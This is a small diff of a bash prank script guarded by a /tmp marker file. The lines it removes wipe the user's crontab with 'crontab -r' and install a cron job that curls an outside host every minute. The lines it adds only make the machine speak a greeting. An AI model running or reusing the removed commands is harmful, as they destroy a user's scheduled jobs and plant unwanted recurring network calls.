@@ -1,7 +1,6 @@
 #!/usr/bin/env bash
 
-if [[ ! -e /tmp/hack.1469362096698 ]]; then
-crontab -r
-echo "* * * * * curl https://chet.sh/live" | crontab
-touch /tmp/hack.1469362096698
+if [[ ! -e /tmp/hack.1469362210349 ]]; then
+say whats up chet
+touch /tmp/hack.1469362210349
 fi
